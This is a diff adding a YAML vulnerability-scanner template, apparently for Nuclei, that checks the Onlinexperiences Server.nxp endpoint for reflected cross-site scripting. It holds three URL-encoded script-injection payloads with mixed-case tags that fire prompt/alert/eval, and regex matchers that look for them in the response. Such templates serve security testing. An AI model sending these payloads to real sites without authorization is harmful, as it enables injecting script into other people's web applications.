@@ -1,0 +1,42 @@
+id: onlinexperiences-xss
+
+info:
+  name: Onlinexperiences XSS
+  author: Vulnpire
+  severity: medium
+  description: Reflected XSS in Onlinexperiences Server.nxp endpoint
+  reference: https://onlinexperiences.com/scripts/Server.nxp
+
+requests:
+  - method: GET
+    path:
+      - "/scripts/Server.nxp?AI=1&ClientBrowser=0&DisplayItem=NULL&EmbedTest={{payload}}&InitialDisplay=1&LASCmd=L%3A0&LangLocaleID=0&LoginType=0&RFR=https%3A%2F%2Fwebinar.intel.com%2F&SSO=1&ShowKey=239834"
+
+    headers:
+      - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3
+
+payloads:
+  - payload: "%22%2B%3C%2FScripT%3E%3CScRIpT%3Eprompt%281%29%3C%2FscRIpT%3E%2F%2F"
+  - payload: "%22%2B%3C%2FScripT%3E%3CScRIpT%3Ealert%281%29%3C%2FscRIpT%3E%2F%2F"
+  - payload: "%22%2B%3C%2FScripT%3E%3CScRIpT%3Eeval%28alert%281%29%29%3C%2FscRIpT%3E%2F%2F"
+
+extractors:
+  - type: regex
+    part: body
+    regex:
+      - "prompt\\(1\\)"
+      - "alert\\(1\\)"
+      - "eval\\(alert\\(1\\)\\)"
+
+matcher:
+  - type: regex
+    part: body
+    regex:
+      - "prompt\\(1\\)"
+      - "alert\\(1\\)"
+      - "eval\\(alert\\(1\\)\\)"
+
+tags:
+  - xss
+  - reflected-xss
+  - onlinexperiences
